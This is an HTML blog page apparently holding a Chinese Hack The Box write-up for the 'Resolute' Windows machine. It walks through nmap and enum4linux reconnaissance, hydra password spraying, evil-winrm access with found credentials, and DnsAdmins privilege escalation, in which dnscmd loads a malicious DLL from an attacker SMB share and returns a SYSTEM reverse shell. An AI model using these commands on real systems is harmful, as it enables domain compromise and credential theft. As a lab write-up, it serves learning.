@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="dnsadmins,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="知识点 ：信息收集和dnsadmins用户组提权">
+<meta name="keywords" content="dnsadmins">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Windows-Resolute">
+<meta property="og:url" content="https://exexute.github.io/2020/06/07/HTB-Windows-Resolute/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="知识点 ：信息收集和dnsadmins用户组提权">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://exexute.github.io/2020/06/07/HTB-Windows-Resolute/resolute-infocard.png">
+<meta property="og:updated_time" content="2022-06-24T14:37:08.024Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB-Windows-Resolute">
+<meta name="twitter:description" content="知识点 ：信息收集和dnsadmins用户组提权">
+<meta name="twitter:image" content="https://exexute.github.io/2020/06/07/HTB-Windows-Resolute/resolute-infocard.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2020/06/07/HTB-Windows-Resolute/">
+
+
+
+
+
+  <title>HTB-Windows-Resolute | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2020/06/07/HTB-Windows-Resolute/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HTB-Windows-Resolute</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-07T11:27:41+08:00">
+                2020-06-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="resolute-infocard.png" alt="infocard"></p>
+<p>知识点 ：<br>信息收集和dnsadmins用户组提权<br><a id="more"></a></p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>端口扫描<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.70 scan initiated Sat Jun  6 11:11:59 2020 as: nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,5985,9389,49665,49666,49667,49671,49677,49688 -oA scan/Resolute 10.10.10.169</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.10.10.169)</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   DNSVersionBindReqTCP:</span><br><span class="line">|     version</span><br><span class="line">|_    <span class="built_in">bind</span></span><br><span class="line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-06-06 03:23:16Z)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">49665/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49671/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49677/tcp open  unknown</span><br><span class="line">49688/tcp open  unknown</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port53-TCP:V=7.70%I=7%D=6/6%Time=5EDB098C%P=x86_64-apple-darwin17.3.0%r</span><br><span class="line">SF:(DNSVersionBindReqTCP,20,<span class="string">"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07ver</span></span><br><span class="line"><span class="string">SF:sion\x04bind\0\0\x10\0\x03"</span>);</span><br><span class="line">Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h31m09s, deviation: 4h02m31s, median: 11m08s</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: Resolute</span><br><span class="line">|   NetBIOS computer name: RESOLUTE\x00</span><br><span class="line">|   Domain name: megabank.local</span><br><span class="line">|   Forest name: megabank.local</span><br><span class="line">|   FQDN: Resolute.megabank.local</span><br><span class="line">|_  System time: 2020-06-05T20:24:10-07:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2020-06-06 11:24:11</span><br><span class="line">|_  start_date: 2020-06-06 00:29:52</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sat Jun  6 11:13:15 2020 -- 1 IP address (1 host up) scanned in 75.81 seconds</span></span><br></pre></td></tr></table></figure></p>
+<p>135、139、445端口开放，存在SMB服务，使用<code>enum4linux</code>进行信息收集，<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ enum4linux 10.10.10.169</span><br></pre></td></tr></table></figure></p>
+<p>发现的有意思的事情：</p>
+<ul>
+<li>域主机，域名：MEGABANK</li>
+<li>发现账号密码：marko Welcome123!</li>
+<li>用户列表：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DefaultAccount</span><br><span class="line">ryan</span><br><span class="line">marko</span><br><span class="line">sunita</span><br><span class="line">abigail</span><br><span class="line">marcus</span><br><span class="line">sally</span><br><span class="line">fred</span><br><span class="line">angela</span><br><span class="line">felicia</span><br><span class="line">gustavo</span><br><span class="line">ulf</span><br><span class="line">stevie</span><br><span class="line">claire</span><br><span class="line">paulo</span><br><span class="line">steve</span><br><span class="line">annette</span><br><span class="line">annika</span><br><span class="line">per</span><br><span class="line">claude</span><br><span class="line">melanie</span><br><span class="line">zach</span><br><span class="line">simon</span><br><span class="line">naoki</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="获取melanie用户"><a href="#获取melanie用户" class="headerlink" title="获取melanie用户"></a>获取melanie用户</h4><p>使用<code>enum4linux</code>、<code>smbclient</code>登录，失败，于是使用发现的所有用户名和密码爆破SMB服务，寻找可用账号；<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -L users.txt -P passwd.txt 10.10.10.169 smb</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-02 22:32:33</span><br><span class="line">[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)</span><br><span class="line">[DATA] max 1 task per 1 server, overall 1 task, 27 login tries (l:27/p:1), ~27 tries per task</span><br><span class="line">[DATA] attacking smb://10.10.10.169:445/</span><br><span class="line">[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-02 22:33:24</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>我是用mac爆破时，如果使用smb://10.10.10.169则无法爆破出账号密码，如果使用10.10.10.169 smb则可以爆破出来。</p>
+</blockquote>
+<p>最后爆破出<code>melanie Welcome123!</code></p>
+<p>由于开放5985端口wsman服务，于是直接使用evil-winrm获取终端：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i <span class="number">10.10</span>.<span class="number">10.169</span> -u melanie -p <span class="string">'Welcome123!'</span></span><br><span class="line"></span><br><span class="line">Info: Starting Evil-WinRM shell v1.<span class="number">7</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\melanie\Documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----         <span class="number">6</span>/<span class="number">5</span>/<span class="number">2020</span>  <span class="number">10</span>:<span class="number">34</span> AM         <span class="number">241664</span> winpeas.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; cd ../desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\desktop&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\melanie\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">7</span>:<span class="number">33</span> AM             <span class="number">32</span> user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\desktop&gt; type user.txt</span><br><span class="line"><span class="number">0</span>c3be45fcfe249796ccbee8d3a978540</span><br></pre></td></tr></table></figure>
+<h4 id="melanie-to-ryan"><a href="#melanie-to-ryan" class="headerlink" title="melanie to ryan"></a>melanie to ryan</h4><p>上传内网信息收集工具，进行信息收集，查看文件系统，在PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt文件中找到域用户<code>megabank\ryan</code>及账号密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br></pre></td></tr></table></figure></p>
+<h4 id="ryan-to-system"><a href="#ryan-to-system" class="headerlink" title="ryan to system"></a>ryan to system</h4><p>查看用户所在的用户组</p>
+<ul>
+<li><code>net user ryan /domain</code></li>
+<li><code>whoami /groups</code></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan&gt; net user ryan /domain</span><br><span class="line">User name                    ryan</span><br><span class="line">Full Name                    Ryan Bertrand</span><br><span class="line">Comment</span><br><span class="line">User&apos;s comment</span><br><span class="line">Country/region code          000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            6/5/2020 8:43:02 PM</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          6/6/2020 8:43:02 PM</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script</span><br><span class="line">User profile</span><br><span class="line">Home directory</span><br><span class="line">Last logon                   6/5/2020 10:16:17 AM</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships</span><br><span class="line">Global Group memberships     *Domain Users         *Contractors</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan&gt; whoami /groups</span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID                                            Attributes</span><br><span class="line">========================================== ================ ============================================== ===============================================================</span><br><span class="line">Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group</span><br><span class="line">NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan&gt; whoami</span><br><span class="line">megabank\ryan</span><br></pre></td></tr></table></figure>
+<h4 id="用户组dnsadmins提权"><a href="#用户组dnsadmins提权" class="headerlink" title="用户组dnsadmins提权"></a>用户组dnsadmins提权</h4><p>写入恶意dll到dns配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dnscmd \\Resolute /config /serverlevelplugindll \\10.10.14.13\share\privesc.dll</span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br></pre></td></tr></table></figure></p>
+<p>重启dns服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sc.exe \\Resolute stop dns</span><br><span class="line">$ sc.exe \\Resolute start dns</span><br></pre></td></tr></table></figure></p>
+<p>SmbServer获得NTLM Hash<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py share workspace/htb/Resolute</span><br><span class="line">Impacket v0.9.22.dev1+20200605.133909.874d7ae4 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Incoming connection (10.10.10.169,50563)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)</span><br><span class="line">[*] User RESOLUTE\RESOLUTE$ authenticated successfully</span><br><span class="line">[*] RESOLUTE$::MEGABANK:4141414141414141:cfe1616a120b772f65297bac6c19bc98:0101000000000000002d7c75543cd6013d464c2b327c44f200000000010010004600690056004400420078006800670003001000460069005600440042007800680067000200100062004300660067004f0044005a0059000400100062004300660067004f0044005a00590007000800002d7c75543cd601060004000200000008003000300000000000000000000000004000008c635b5e900e78ca8c7a8f352b339a178f5404a45222a9104bbfde364acca55b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310033000000000000000000</span><br><span class="line">[*] Disconnecting Share(1:IPC$)</span><br></pre></td></tr></table></figure></p>
+<h5 id="nc收到system权限的shell"><a href="#nc收到system权限的shell" class="headerlink" title="nc收到system权限的shell"></a>nc收到system权限的shell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lv 4444</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="拿到root权限"><a href="#拿到root权限" class="headerlink" title="拿到root权限"></a>拿到root权限</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;cd c:\Users</span><br><span class="line">cd c:\Users</span><br><span class="line"></span><br><span class="line">c:\Users&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 923F-3611</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users</span><br><span class="line"></span><br><span class="line">12/04/2019  03:46 AM    &lt;DIR&gt;          .</span><br><span class="line">12/04/2019  03:46 AM    &lt;DIR&gt;          ..</span><br><span class="line">09/25/2019  10:43 AM    &lt;DIR&gt;          Administrator</span><br><span class="line">12/04/2019  03:46 AM    &lt;DIR&gt;          melanie</span><br><span class="line">11/20/2016  07:39 PM    &lt;DIR&gt;          Public</span><br><span class="line">09/27/2019  07:05 AM    &lt;DIR&gt;          ryan</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               6 Dir(s)  30,129,467,392 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users&gt;cd Administrator\Desktop</span><br><span class="line">cd Administrator\Desktop</span><br><span class="line"></span><br><span class="line">c:\Users\Administrator\Desktop&gt;type root.txt</span><br><span class="line">type root.txt</span><br><span class="line">e1d94876a506850d0c20edb5405e619c</span><br></pre></td></tr></table></figure>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2" target="_blank" rel="noopener">DnsAdmins提升至System</a></p>
+<p><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise" target="_blank" rel="noopener">DnsAdmins提升至System - RedTeam</a></p>
+<p><a href="https://blog.ropnop.com/transferring-files-from-kali-to-windows/" target="_blank" rel="noopener">从linux转发文件到windows</a></p>
+
+      
